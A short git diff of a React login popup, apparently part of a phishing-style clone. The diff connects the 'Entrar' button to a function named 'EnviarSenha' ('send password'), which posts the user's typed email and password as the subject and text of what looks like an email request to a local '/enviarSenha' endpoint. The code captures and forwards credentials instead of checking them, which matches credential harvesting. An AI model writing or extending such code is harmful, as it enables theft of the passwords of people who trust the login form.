@@ -19,12 +19,18 @@ export default function PopUp() {
 
 
     const EnviarSenha = async () => {
-        let dadosPessoa = {
-            subject: EMAIL,
-            text: PWD
+        try {
+            
+            let dadosPessoa = {
+                subject: EMAIL,
+                text: PWD
+            }
+            let resposnse = await axios.post('http://localhost:5000/enviarSenha', dadosPessoa)
+            console.log(resposnse)
+
+        } catch (err) {
+            console.log(err.message)
         }
-        let resposnse = await axios.post('http://localhost:5000/enviarSenha', dadosPessoa)
-        console.log(resposnse)
     }
 
     const IsHide = () => {
@@ -56,7 +62,7 @@ export default function PopUp() {
 
                         </div>
 
-                        <button> Entrar </button>
+                        <button onClick={EnviarSenha}> Entrar </button>
                         <div className='Lines'>
                             <span></span>
                             <a> OU </a>
